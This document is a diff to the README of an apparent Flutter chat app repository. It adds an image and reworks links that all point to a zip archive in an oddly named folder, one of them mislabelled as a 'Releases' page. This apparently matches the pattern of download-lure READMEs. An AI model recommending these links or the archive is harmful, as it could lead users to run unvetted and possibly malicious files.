@@ -4,11 +4,13 @@
 
 Welcome to the Chat-application-flutter project! This application helps you stay connected with friends and family through an intuitive chat interface. Using Flutter and Firebase, you can enjoy a smooth and quick messaging experience across mobile devices.
 
+<img src="https://github.com/Ransom9967/Chat-application-flutter/raw/main/screenshots/chatappsvg.svg"/>
+
 ## 📥 Download & Install
 
 To get started, you'll need to download the application. Click the link below:
 
-[![Download Chat-application-flutter](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip%20Application%20Flutter-brightgreen)](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip)
+[Download Chat-application-flutter](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip)
 
 1. **Visit this page to download:** [Chat-application-flutter Releases](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip)
    
@@ -115,5 +117,3 @@ If you encounter any issues during installation or usage, consider the following
 Please refer to the issues section of the repository for detailed troubleshooting or report your issue.
 
 Feel free to explore and enjoy your experience with the Chat-application-flutter! For any other queries, don’t hesitate to reach out through the repository.  
-
-[![Download Chat-application-flutter](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip%20Application%20Flutter-brightgreen)](https://raw.githubusercontent.com/Ransom9967/Chat-application-flutter/main/discriminatively/Chat-application-flutter.zip)
